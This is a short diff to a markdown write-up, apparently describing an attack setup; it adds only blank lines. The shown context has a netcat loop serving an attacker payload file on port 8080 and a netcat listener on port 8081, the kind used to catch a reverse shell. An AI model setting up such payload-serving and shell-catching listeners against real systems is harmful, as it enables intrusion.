@@ -65,12 +65,14 @@ while true; do
 nc -l -p 8080 -w 1 < response.txt
 done
 ```
+
 ### Server process 2
 
 ```
 clear
 nc -lvnp 8081
 ```
+
 In the response.txt file there is the payload that the attacker wants to execute, wich is sent as a response to http get requests to `process 1`.  
 
 
